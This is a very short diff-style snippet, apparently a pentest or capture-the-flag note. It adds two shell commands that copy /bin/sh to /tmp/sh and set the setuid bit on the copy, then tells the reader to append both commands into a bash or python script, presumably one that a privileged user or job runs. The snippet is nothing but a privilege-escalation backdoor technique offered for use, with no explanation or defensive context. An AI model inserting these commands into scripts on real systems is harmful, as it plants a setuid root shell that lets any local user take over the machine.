@@ -1,0 +1,5 @@
+cp /bin/sh /tmp/sh
+chmod u+s /tmp/sh
+
+append the both command into script bash or python
+
